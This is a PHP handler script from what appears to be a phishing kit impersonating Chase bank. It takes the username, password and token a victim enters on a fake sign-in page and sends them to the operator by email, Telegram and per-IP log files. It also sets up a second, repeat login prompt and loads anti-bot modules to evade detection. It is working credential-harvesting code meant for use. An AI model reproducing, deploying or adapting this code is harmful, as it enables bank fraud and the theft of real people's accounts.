<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";

$ip = $_SERVER['REMOTE_ADDR'];$user = $_POST['juser'];$password = $_POST['jpass'];

if(isset($_POST['btnlogin']) && isset($_POST['juser']) && isset($_POST['jpass'])){
    if(strlen($password) > 5 && strlen($user) > 4){
		
	///////////////////////// MAIL PART //////////////////////
		
		$token  = $_POST['token'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
		if(isset($_GET['p2'])){$reshead="--------------- CONFIRM CHASE LOG ----------------";}
		else{$reshead="--------------- 🔷🌀 NEW CHASE LOG 🔷🌀 --------------";};
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
$reshead
Account Token    : $token
UserName         : $user 
Password         : $password ";
		if(isset($_GET['p2'])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;}
$Info_LOG.="
".$_SESSION['device'];


// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET['p2'])?'(2)':'(1)';
            $subject = $PublicIP.' 🔷🌀 '.$i.' CHASE LOGIN';$headers = 'From: YoCHI <yochchasedemons@yochchaser.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET['p2']) && $doubleloginentry==1){header("location:Signin.php?entryerr=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol&p2=On");}
		else{header("location:verify.php?id=myaccount&y=".md5(rand(100, 999999999))."");};
    }
    else{
		header("location:Signin.php?loginFailed_id=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol");
    };
}
else{
	header("location:Signin.php?loginFailed_id=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol");
};
?>